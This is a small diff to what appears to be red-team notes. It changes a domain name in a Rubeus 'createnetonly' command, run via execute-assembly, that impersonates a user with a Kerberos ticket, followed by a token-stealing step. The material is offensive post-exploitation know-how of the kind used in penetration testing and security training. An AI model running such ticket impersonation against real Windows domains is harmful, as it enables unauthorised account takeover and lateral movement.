@@ -25,7 +25,7 @@ checkin
 Impersionation with ticket
 
 ```
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:username /password:FakePass /ticket:doIFwj[...]MuSU8=
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ACME /username:username /password:FakePass /ticket:doIFwj[...]MuSU8=
 setal_token xxx
 
 ```
